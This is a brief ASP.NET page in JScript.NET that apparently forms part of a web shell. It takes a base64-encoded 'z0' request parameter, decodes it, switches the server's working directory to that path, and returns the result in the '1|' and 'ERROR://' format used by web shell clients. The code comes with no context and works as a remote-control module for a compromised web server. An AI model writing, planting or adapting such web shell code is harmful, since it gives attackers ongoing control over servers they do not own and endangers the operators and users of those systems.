<%

if (Request.Item["z0"] != null) {

    try {
        var base64String : String = Request.Item["z0"];
        var byteBuffer : byte[] = Convert.FromBase64String(base64String);
        var szDirPath : String = Encoding.UTF8.GetString(byteBuffer);
        System.IO.Directory.SetCurrentDirectory(szDirPath);
        
        Response.Write("1|" + System.IO.Directory.GetCurrentDirectory());
        
    } catch (ex : Exception) {
        Response.Write("ERROR://Cannot open directory.");
    }
}

%>